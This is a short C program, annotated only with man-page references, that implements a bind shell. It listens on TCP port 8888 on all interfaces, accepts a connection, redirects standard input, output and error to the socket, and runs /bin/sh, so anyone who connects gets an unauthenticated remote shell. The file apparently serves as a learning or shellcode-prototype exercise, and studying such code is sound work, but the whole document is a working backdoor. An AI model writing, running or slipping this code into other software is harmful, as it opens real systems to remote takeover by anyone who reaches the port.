#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main(){
	// man socket
	int host_socket = socket(AF_INET, SOCK_STREAM, 0);

	// man 7 ip
	struct sockaddr_in host_address;

	host_address.sin_family = AF_INET;
	// man htons
	host_address.sin_port = htons(8888);
	host_address.sin_addr.s_addr = INADDR_ANY;	
	
	// man bind
	bind(host_socket, (struct sockaddr *)&host_address, sizeof(host_address));

	// man listen
	listen(host_socket, 0);

	// man 2 accept
	int client_socket = accept(host_socket, NULL, NULL);

	// man dup
	dup2(client_socket, 0);
	dup2(client_socket, 1);
	dup2(client_socket, 2);

	// man execve
	execve("/bin/sh", NULL, NULL);
}